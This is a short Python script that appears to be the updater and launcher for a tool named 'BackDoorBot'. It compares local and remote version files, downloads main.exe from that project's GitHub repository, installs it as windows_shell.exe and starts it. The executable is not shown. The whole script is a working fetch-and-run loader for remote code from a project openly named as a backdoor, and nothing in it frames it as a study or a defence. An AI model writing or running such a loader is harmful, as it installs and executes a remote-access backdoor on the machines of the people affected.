# -*- coding: utf8 -*-
import os, wget
p=os.getcwd()
def main():
    while 1:
        try:
            file = open(p+"/vers/version.txt", "r")
            versia=file.read().split("\n")[-1]
            break
        except:
            wget.download("https://raw.githubusercontent.com/DmodvGH/BackDoorBot/main/version.txt", p+"/vers/version.txt")
    while 1:
        try:
            listvers = open(p+"/vers/vers.txt", "r")
            versiam=listvers.read().split("\n")[0]
            break
        except:
            listvers = open(p+"/vers/vers.txt", "w")
            listvers.write("2.1")

    if versia[:5]==versiam:
        return 1, "0.0.0"
    else:
        return 0, versia[:5]
while 1:
    if 1:
        klop, kakai_versia=main()
        if klop:
            os.startfile("windows_shell.exe")
            break
        else:
            wget.download(f"https://raw.githubusercontent.com/DmodvGH/BackDoorBot/main/main_bot/main.exe", p+"/vers/windows_shell.exe")
            try:
                os.remove(p+"/windows_shell.exe")
            except: pass
            os.replace("vers/windows_shell.exe", "windows_shell.exe")
            vers= open(p+"/vers/vers.txt", "w")
            vers.write(kakai_versia)
            vers.close()
            os.remove(p+"/vers/version.txt")
    else:   pass